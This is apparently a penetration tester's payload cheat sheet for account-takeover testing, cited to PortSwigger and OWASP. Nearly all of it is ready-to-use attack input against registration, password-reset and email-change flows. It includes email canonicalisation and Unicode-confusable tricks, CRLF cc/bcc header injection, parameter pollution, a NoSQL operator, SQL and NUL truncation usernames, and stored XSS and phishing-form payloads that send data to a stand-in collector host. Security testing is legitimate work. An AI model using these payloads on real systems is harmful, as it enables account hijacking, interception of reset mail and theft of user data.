# Email & Identity Manipulation Payloads (AB-09, AB-27, AB-29, AB-30, AB-33, AB-34, AB-35)

Placeholders: `{victim}` = local part of the victim address you own (account **B**), `{vdomain}` = its domain, `{attacker}` = full attacker address you own (account **A**), `{adomain}` = attacker domain. `scripts/identity_variants.py --mode email` expands these automatically.

Use against: registration, email change, password reset, invite, OTP/verification resend, SSO account linking.
What to look for: B's reset/verification/OTP delivered to A; a second account for B's address; A's login opening B's account; mail header injection copying A.

## 1. Case & canonicalisation

```
{VICTIM}@{VDOMAIN}                 (all upper)
{Victim}@{Vdomain}                 (mixed, e.g. MAybeeEE@GmaiL.coM)
{victim}@{vdomain}.                (trailing dot FQDN)
{victim}+1@{vdomain}               (plus addressing)
{v.i.c.t.i.m}@{vdomain}            (dot insertion - Gmail ignores dots)
"{victim}"@{vdomain}               (quoted local part)
```

## 2. Whitespace, NUL & control characters

```
{victim}@{vdomain} a
{victim}%00@{vdomain}
{victim}%09@{vdomain}
{victim}%20@{vdomain}
 {victim}@{vdomain}                (leading space)
{victim}@{vdomain}%00
{victim}@{vdomain}\n
{victim}@{vdomain}%0a
{victim}@{vdomain}%0d
{victim}@{vdomain}%0d%0a
%0a{victim}@{vdomain}
%0d%0a{victim}@{vdomain}
```

## 3. Multiple recipients, delimiters & header injection

```
{victim}@{vdomain},{attacker}
{victim}@{vdomain};{attacker}
{victim}@{vdomain}|{attacker}
{victim}@{vdomain}%20{attacker}
{victim}@{vdomain}%0A%0Dcc:{attacker}
{victim}@{vdomain}%0A%0Dbcc:{attacker}
{victim}@{vdomain}%0d%0a{attacker}
{attacker}%0d%0a{victim}@{vdomain}
{attacker}:{victim}@{vdomain}
{attacker}","{victim}@{vdomain}    (quote-comma-quote breakout)
```

## 4. Parameter pollution & type confusion

```
email={victim}@{vdomain}&email={attacker}
email={victim}@{vdomain}&Email={attacker}          (case-variant key)
{"email":["{victim}@{vdomain}","{attacker}"]}
{"email":"{victim}@{vdomain}","email":"{attacker}"}   (duplicate JSON key)
{"email":{"$ne":""}}                                 (NoSQL operator)
```

## 5. Authority / parser confusion

```
{victim}@{vdomain}@{adomain}
{victim}@{vdomain}%40{adomain}
{victim}%40{vdomain}@{adomain}
{victim}@{vdomain}.{adomain}
{victim}@{vdomain}{{}}             (template / brace handling)
=?utf-8?q?{victim}=40{vdomain}=3e=00?=@{adomain}   (encoded-word, PortSwigger "Splitting the email atom")
```

## 6. Unicode confusables (AB-29)

```
{victim with i -> ı (U+0131)}@{vdomain}
{victim with k -> K (U+212A Kelvin)}@{vdomain}
{victim with s -> ſ (U+017F)}@{vdomain}
{victim fullwidth (NFKC folds to ASCII)}@{vdomain}
{victim}@{vdomain with Cyrillic homoglyph}         (IDN / punycode)
```

## 7. Username collisions (AB-34, AB-35, AB-38)

```
AdMIn / ADMIN / admin        (case variants)
admin=  admin.  admin_  admin-        (trailing punctuation)
admin<spaces to column length>x       (SQL truncation)
admin%00 / admin%00x                  (NUL truncation)
ａｄｍｉｎ (fullwidth) / ᴬᵈᵐⁱⁿ          (NFKC folding)
login / api / static / .well-known / robots.txt / favicon.ico / sw.js   (reserved / path overwrite)
```

## 8. Registration / profile fields: stored injection (AB-39)

Replace `COLLAB` with your own collector.

```
"><img src=x onerror=fetch('//COLLAB/r?'+document.domain)>
'"><script src=//COLLAB/x.js></script>
"/><img src="x"><a href="https://COLLAB">login</a>
<button name=x type=submit formaction='https://COLLAB'>Continue</button>
<form action='https://COLLAB/log'><input type=submit value='Verify account'></form>
<meta http-equiv="refresh" content='0; url=https://COLLAB/'>
"<svg/onload=fetch('//COLLAB')>"@{adomain}         (quoted local part is RFC-valid)
```

## Sources

- PortSwigger Research, *Splitting the email atom: exploiting parsers to bypass access controls* (2024)
- PortSwigger Academy: logic-flaw labs *Inconsistent handling of exceptional input*, *Inconsistent security controls*; race-condition lab *Single-endpoint race conditions*
- Community checklists (KongList / H0tak88r OTP & registration notes), Jerry Shah *Duplicate Registration – The Twinning Twins*
- OWASP WSTG Identity Management Testing (WSTG-IDNT-02, -04, -05)
